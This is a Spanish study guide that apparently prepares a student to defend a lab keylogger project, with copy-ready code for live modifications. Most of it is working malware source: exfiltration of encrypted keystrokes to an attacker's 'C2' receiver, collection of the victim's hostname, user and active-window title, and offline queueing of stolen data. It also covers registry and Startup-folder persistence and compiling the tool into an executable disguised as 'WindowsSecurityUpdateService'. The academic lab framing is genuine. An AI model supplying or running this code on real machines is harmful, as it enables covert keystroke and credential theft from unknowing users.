# Preparación — Cambios Complejos en Vivo

**Para la defensa:** el profesor puede pedir modificaciones que toman 5–15 minutos.  
Aquí van cambios más avanzados que los de `preparacion_defensa.md`, con código listo para copiar.

**Regla general:** modifica → guarda → reinicia keylogger y receptor → demuestra con Bloc de notas.

---

## Nivel 1 — Metadatos y contexto de la víctima

### Agregar hostname y usuario al payload

**Por qué lo pedirían:** identificar de qué máquina vienen los logs si hay varias víctimas.

**Archivo:** `src/exfiltration.py`

```python
import socket
import getpass

def send_encrypted_data(encrypted_payload: str) -> bool:
    try:
        data = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "payload": encrypted_payload,
        }
        # ... resto igual
```

**Archivo:** `src/receiver.py` — mostrar en consola:

```python
hostname = data.get("hostname", "desconocido")
username = data.get("username", "desconocido")
print(f"[{hostname} / {username}]")
```

**Cómo probar:** reiniciar ambos, escribir en víctima, ver hostname en el receptor.

**Qué decir:** "Agregué metadatos en claro al JSON. El contenido sensible sigue cifrado en `payload`."

---

### Agregar ventana activa (título de la app)

**Archivo:** `src/keylogger.py` — al formatear el log:

```python
import ctypes

def get_active_window_title() -> str:
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value or "desconocido"
```

En `exfiltration_loop`, antes de cifrar:

```python
header = f"=== Ventana: {get_active_window_title()} ===\n"
raw_log = (header + "\n".join(log_lines)).encode("utf-8")
```

**Qué decir:** "Así sabemos si el usuario escribía en el navegador, Word o la consola."

---

## Nivel 2 — Resiliencia si falla la red

### Cola de reintentos en memoria

**Por qué:** si el receptor está apagado, no perder las teclas del intervalo.

**Archivo:** `src/keylogger.py`

```python
pending_queue = []  # payloads cifrados que no se pudieron enviar

def exfiltration_loop():
    global pending_queue
    while True:
        time.sleep(SEND_INTERVAL)
        data = get_buffer_and_clear()
        if data:
            log_lines = [f"{t.isoformat()} | {c}" for t, c in data]
            encrypted = encrypt("\n".join(log_lines).encode("utf-8"), KEY)
            pending_queue.append(encrypted)

        # Intentar enviar todo lo pendiente
        still_pending = []
        for payload in pending_queue:
            if not send_encrypted_data(payload):
                still_pending.append(payload)
        pending_queue = still_pending
```

**Cómo probar:** apagar receptor → escribir → encender receptor → debe llegar todo junto.

**Qué decir:** "Si falla el POST, el payload cifrado queda en cola y se reintenta cada ciclo."

---

### Guardar en disco si no hay conexión

**Archivo:** nuevo `src/offline_store.py`

```python
import os
from app_paths import get_app_dir

QUEUE_FILE = os.path.join(get_app_dir(), "pending.enc")

def save_pending(payload_b64: str) -> None:
    with open(QUEUE_FILE, "a", encoding="utf-8") as f:
        f.write(payload_b64 + "\n")

def load_all_pending() -> list[str]:
    if not os.path.isfile(QUEUE_FILE):
        return []
    with open(QUEUE_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def clear_pending() -> None:
    if os.path.isfile(QUEUE_FILE):
        os.remove(QUEUE_FILE)
```

En `exfiltration_loop`, si `send_encrypted_data` falla → `save_pending(encrypted)`. Al inicio del loop, cargar pendientes y reintentar.

**Agregar a `.gitignore`:** `pending.enc`

---

## Nivel 3 — Seguridad del receptor

### Token simple en el POST (autenticación básica)

**Por qué:** que solo tu keylogger pueda enviar al receptor.

**Archivo:** `src/config.py`

```python
API_TOKEN = "mi_token_secreto_lab_2026"
```

**`exfiltration.py`:**

```python
from config import API_TOKEN

headers = {
    "Content-Type": "application/json",
    "X-Api-Token": API_TOKEN,
}
response = requests.post(SERVER_URL, json=data, headers=headers, timeout=10)
```

**`receiver.py`:**

```python
from config import API_TOKEN

@app.route("/upload", methods=["POST"])
def upload():
    if request.headers.get("X-Api-Token") != API_TOKEN:
        return jsonify({"error": "No autorizado"}), 401
    # ... resto igual
```

**Qué decir:** "No es HTTPS, pero evita que cualquiera en la red mande datos falsos al receptor."

---

### Cambiar puerto del receptor

**`config.py`:**

```python
SERVER_PORT = 8080
SERVER_URL = f"http://192.168.56.108:{SERVER_PORT}/upload"
```

**`receiver.py`:**

```python
from config import SERVER_PORT
app.run(host="0.0.0.0", port=SERVER_PORT, debug=False)
```

Reiniciar receptor y keylogger. Actualizar filtro Wireshark: `tcp.port == 8080`.

---

## Nivel 4 — Cambios en cifrado

### Derivar clave desde una contraseña (PBKDF2)

**Si piden:** "no quiero un archivo secret.key suelto".

**`crypto_utils.py`:**

```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
    )
    return kdf.derive(password.encode("utf-8"))
```

Guardar `salt` en `secret.key` (solo el salt, no la clave). La contraseña podría venir de variable de entorno `KEYLOGGER_PASSWORD`.

**Qué decir:** "La clave se deriva de una contraseña. Sin la contraseña, el salt solo no alcanza."

---

### Si piden usar XOR o Base64 "como cifrado" (trampa común)

**Respuesta:** "Base64 no es cifrado, es codificación reversible sin clave. XOR con clave corta es débil. Mantengo AES-GCM porque es lo correcto para el ejercicio."

Si **insisten** en demostrar por qué XOR es malo, función temporal:

```python
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

Demostrar que con frecuencia de letras se recupera el texto. Luego volver a AES-GCM.

---

## Nivel 5 — Persistencia avanzada

### Persistir solo el .exe (sin .bat)

**Archivo:** `src/persistence.py` — en `add_to_registry`, si el path termina en `.exe`:

```python
if launcher_path.lower().endswith(".exe"):
    command = f'"{launcher_path}"'
else:
    command = f'"{launcher_path}"'  # .bat
```

Llamar `install_persistence(r"C:\LabKeylogger\WindowsSecurityUpdateService.exe")`.

**Qué decir:** "Con el ejecutable compilado ya no necesitamos Python en el registro."

---

### Persistencia solo en carpeta Startup (sin registro)

Comentar `add_to_registry()` dentro de `install_persistence()` y dejar solo `add_to_startup_folder()`.

**Qué decir:** "Es menos visible en `reg query`, pero más fácil de encontrar en la carpeta Inicio."

---

### HKLM en vez de HKCU (requiere admin)

Cambiar en `persistence.py`:

```python
winreg.HKEY_LOCAL_MACHINE,
r"Software\Microsoft\Windows\CurrentVersion\Run",
```

**Qué decir:** "HKLM afecta a todos los usuarios pero requiere ejecutar como administrador. Por eso usamos HKCU en el proyecto."

---

## Nivel 6 — Filtros y límites del keylogger

### No capturar teclas cuando no hay actividad útil

Ignorar teclas sueltas de Shift/Ctrl/Alt sin letra:

```python
IGNORE = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l,
          keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r}

def on_press(key):
    if key in IGNORE:
        return
    # ... resto
```

---

### Límite de tamaño del buffer (anti-memoria)

```python
MAX_BUFFER = 5000

def on_press(key):
    # ... obtener char ...
    with buffer_lock:
        if len(buffer) < MAX_BUFFER:
            buffer.append((datetime.now(), char))
```

**Qué decir:** "Evita crecimiento infinito si la víctima no para de escribir."

---

### Enviar solo si hay más de N teclas

En `exfiltration_loop`:

```python
MIN_EVENTS = 5
if len(data) < MIN_EVENTS:
    # devolver al buffer
    with buffer_lock:
        buffer[:0] = data
    continue
```

---

## Nivel 7 — Configuración sin tocar código

### Leer IP del atacante desde variable de entorno

**`config.py`:**

```python
import os
SERVER_URL = os.environ.get(
    "KEYLOGGER_SERVER",
    "http://192.168.56.108:5000/upload"
)
```

**Probar en víctima:**

```powershell
$env:KEYLOGGER_SERVER = "http://192.168.56.108:5000/upload"
python keylogger.py
```

**Qué decir:** "Permite cambiar el C2 sin recompilar ni editar el código."

---

## Nivel 8 — Recompilar el .exe en vivo

Si piden ver PyInstaller en la defensa:

```powershell
cd Y:\build
.\build.ps1
copy Y:\dist\WindowsSecurityUpdateService.exe C:\LabKeylogger\
```

Si piden **cambiar el nombre** del ejecutable, editar `build/build.ps1`:

```powershell
--name MiNuevoNombre
```

Y en `config.py` → `APP_NAME` debe coincidir si quieres coherencia en persistencia.

**Tiempo:** 2–3 minutos de compilación. Mientras, explica qué hace `--onefile` y `--noconsole`.

---

## Nivel 9 — Demostraciones rápidas sin mucho código

### MITM en vivo con el script demo

```powershell
cd Y:\src
python demo_mitm_decrypt.py --demo
```

Explicar `InvalidTag` = clave incorrecta o datos alterados.

---

### Verificar persistencia en vivo

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSecurityUpdateService
type Y:\src\run_keylogger.bat
schtasks /query /tn WindowsSecurityUpdateService
```

---

### Ver tráfico con PowerShell (sin Wireshark)

```powershell
# En atacante, mientras corre el receptor
netstat -an | findstr 5000
```

Debe aparecer conexión ESTABLISHED desde 192.168.56.107.

---

## Si te piden algo que NO está preparado

| Pedido | Respuesta honesta |
|---|---|
| Keylogger en Android/Linux | "El proyecto está orientado a Windows 11; en otro SO cambiaría pynput por otra API." |
| Kernel driver | "Fuera del alcance; requiere driver firmado y es mucho más detectable." |
| Bypass Defender en vivo | "Solo usamos exclusión en la VM de lab; evadir EDR comercial no es el objetivo." |
| HTTPS con certificado real | "Se puede con Flask + cert autofirmado; el cifrado AES ya protege el contenido." |
| Robar clave del exe | "Con PyInstaller la clave en archivo es más fácil de extraer; por eso documentamos la debilidad." |

---

## Orden sugerido para practicar (de más probable a más difícil)

1. Cambiar `SEND_INTERVAL` y `SERVER_URL` en `config.py`
2. Agregar hostname/username al payload
3. Token `X-Api-Token` en receptor
4. Cola de reintentos en memoria
5. Persistencia apuntando al `.exe`
6. Ventana activa con `ctypes`
7. Recompilar con `build.ps1`
8. Guardar pendientes en `pending.enc`

---

## Checklist antes de la defensa (cambios complejos)

- [ ] Sé abrir y navegar los 8 archivos de `src/` sin buscar
- [ ] Practiqué al menos 3 cambios de esta guía en la VM
- [ ] Sé revertir un cambio (Ctrl+Z o `git checkout -- archivo`)
- [ ] Tengo `git status` limpio o sé qué archivos toqué
- [ ] Receptor y víctima arrancan en menos de 1 minuto